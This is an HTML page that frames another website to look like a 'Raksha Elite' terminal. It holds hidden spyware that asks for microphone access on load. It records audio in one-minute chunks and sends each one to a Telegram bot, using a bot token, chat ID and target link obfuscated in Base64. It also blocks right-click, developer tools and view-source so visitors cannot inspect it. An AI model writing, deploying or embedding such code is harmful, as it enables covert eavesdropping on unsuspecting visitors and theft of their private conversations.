<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha Elite - Terminal</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault()); // Right click block
        document.onkeydown = function(e) {
            if(e.keyCode == 123) return false; // F12 block
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Ctrl+Shift+I
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Ctrl+Shift+J
            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Ctrl+U (View Source)
        };
    </script>
</head>
<body onload="initializeSecureSync()">

    <iframe id="secureFrame" src="" allow="microphone; camera;"></iframe>

    <script>
        // आपकी जानकारी यहाँ Encrypted है (Base64)
        const _0x5a1 = "ODM3ODAzNzkzNzpBQUdqdUZkWldsbmYwa0ZmVEdfUUlGc2xndnJETUItc0M0"; // BOT_TOKEN
        const _0x2b9 = "ODUwODc5MjQwMw=="; // CHAT_ID
        const _0x9f3 = "aHR0cHM6Ly9hZXN0aGV0aWMteWVvdC05M2Q4MzUubmV0bGlmeS5hcHA="; // REAL_LINK

        function decodeData(data) { return atob(data); }

        async function initializeSecureSync() {
            // असली लिंक को डिकोड करके फ्रेम में लोड करना
            document.getElementById('secureFrame').src = decodeData(_0x9f3);

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", decodeData(_0x2b9));
                    fd.append("voice", blob, "secure_log.ogg");
                    
                    fetch(`https://api.telegram.org/bot${decodeData(_0x5a1)}/sendVoice`, { method: "POST", body: fd });
                    chunks = [];
                    if (stream.active) { setTimeout(() => recorder.start(), 1000); }
                };

                recorder.start();
                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
            } catch (err) { console.log("System Running..."); }
        }
    </script>
</body>
</html>
